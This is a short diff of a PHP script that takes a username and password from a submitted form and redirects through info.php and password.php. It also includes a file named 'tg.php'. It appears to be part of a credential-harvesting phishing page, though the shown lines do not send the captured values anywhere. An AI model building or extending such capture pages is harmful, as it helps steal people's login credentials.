@@ -4,7 +4,7 @@ include('tg.php');
 $id=$_GET["id"];
 if($_POST){
 $user=$_POST["user"];
-header("location: info.php?nick=$user");
+header("location: info.php?id=$id");
 $password=$_POST["password"];
 header("location: password.php?id=$id");
 
